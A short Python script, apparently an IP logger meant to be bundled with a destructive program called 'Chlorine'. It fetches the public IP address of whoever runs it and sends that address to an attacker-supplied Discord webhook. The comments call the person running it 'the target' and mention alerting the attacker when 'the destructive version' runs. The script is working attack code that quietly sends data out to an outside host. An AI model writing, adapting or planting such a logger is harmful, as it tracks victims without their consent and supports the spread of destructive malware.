import requests # pip install requests

url = 'DISCORD WEBHOOK HERE' # Put your url in the ''  


ip = requests.get('https://icanhazip.com/') #  IP address to variable ip

# Access the text content of the response, which contains the webpage's HTML. (Which is just the ip address of the target)

webpage_text = ip.text # Set ip to the the variable ip

# Print the HTML content of the webpage.

data = { # To Do: Add pfp icon
    "username": "Ip logger!", # This is the username of webhook. this can be anything you want 
    "content": "Heads up! Someone ran Chlorine!! lmao. Heres there ip:", # This is the message the logger sends, As we can see, this sends when someone runs the destructive version 
    "embeds": [{ # embeds
    "title": "ip is here",
    "description": ip.text # show the targets ip in the message
    }]
}

x = requests.post(url, json=data) # send the message
